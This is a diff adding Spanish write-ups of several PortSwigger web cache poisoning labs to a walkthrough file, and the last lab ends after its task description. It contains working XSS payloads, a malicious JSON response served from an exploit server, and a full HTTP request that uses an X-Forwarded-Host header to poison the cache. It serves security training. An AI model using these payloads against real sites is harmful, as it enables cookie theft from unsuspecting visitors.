@@ -114,3 +114,72 @@ El objetivo es manipular la función JavaScript callback utilizada en el script 
 ```
 callback=alert(1)
 ```
+
+## Reto 9: Normalización de URL
+
+Este laboratorio contiene una vulnerabilidad XSS que no se puede explotar directamente debido a la codificación de URL del navegador.
+
+Para resolver el laboratorio, aproveche el proceso de normalización de la caché para explotar esta vulnerabilidad. Encuentre la vulnerabilidad XSS e inyecte una carga útil que se ejecute. alert(1)En el navegador de la víctima. Luego, le entrega la URL maliciosa. 
+
+ vulnerabilidad XSS reflejada que, por sí sola, no es explotable en el navegador debido a que los caracteres especiales son codificados automáticamente en la barra de direcciones. Sin embargo, la clave está en cómo la caché normaliza las URLs.
+
+Cuando se realiza una petición con una carga maliciosa en la ruta, la respuesta refleja directamente dicha ruta en el cuerpo. Aunque al acceder desde el navegador la carga se codifica y no se ejecuta, si previamente se ha hecho una petición idéntica desde Burp (sin codificación), la respuesta se almacena en la caché.
+
+```
+/error</p><script>alert(1)</script>
+```
+
+## Reto 10: Envenenamiento de caché web para explotar una vulnerabilidad DOM a través de una caché con criterios estrictos de capacidad de almacenamiento en caché.
+
+Este laboratorio contiene una vulnerabilidad basada en DOM que puede explotarse como parte de un ataque de envenenamiento de caché web. Un usuario visita la página de inicio aproximadamente una vez por minuto. Tenga en cuenta que la caché utilizada en este laboratorio tiene criterios más estrictos para determinar qué respuestas se pueden almacenar en caché, por lo que deberá estudiar su comportamiento con detenimiento.
+
+Para resolver el laboratorio, envenene el caché con una respuesta que se ejecute alert(document.cookie)en el navegador del visitante. 
+
+En este laboratorio se explota una vulnerabilidad DOM-based XSS que no es directamente alcanzable por el atacante, pero que se puede activar mediante envenenamiento de caché. El desafío adicional es que el sistema de caché impone criterios estrictos, descartando por ejemplo las respuestas que contienen encabezados como ‘Set-Cookie‘.
+
+El ataque se lleva a cabo manipulando el encabezado ‘X-Forwarded-Host‘ para que el script ‘initGeoLocate()‘ cargue un archivo JSON malicioso desde el exploit server, el cual contiene un payload que desencadena una ejecución de código en el navegador (por ejemplo, un ‘alert(document.cookie)‘). Para lograr que esta respuesta se almacene en la caché, se evita que el servidor incluya encabezados bloqueantes como Set-Cookie.
+
+En el exploit server:
+
+```
+File: /resources/json/geolocate.json
+Head:
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+Access-Control-Allow-Origin: *
+Body: 
+{
+    "country": "<img src=0 onerror=alert(document.cookie) />"
+}
+
+```
+
+En la raíz tenemos que agregar las cabeceras para que la víctima se encuentre con la alerta
+
+```
+GET / HTTP/2
+Host: 0a40007a045810c58156a22f00ef0025.web-security-academy.net
+Cookie: session=tJ45m5QUXMbUcUVSKGRzZ0BQpRJGJgXA
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+X-Forwarded-Host: exploit-0ad800f704cb102b811ca13301a80010.exploit-server.net
+```
+
+## Reto 11: Combinación de vulnerabilidades de envenenamiento de caché web
+
+
+Este laboratorio es susceptible al envenenamiento de caché web, pero solo si se construye una cadena de explotación compleja.
+
+Un usuario visita la página de inicio aproximadamente una vez por minuto y su idioma está configurado en inglés. Para resolver este laboratorio, envenene la caché con una respuesta que se ejecute alert(document.cookie)en el navegador del visitante. 
+
+
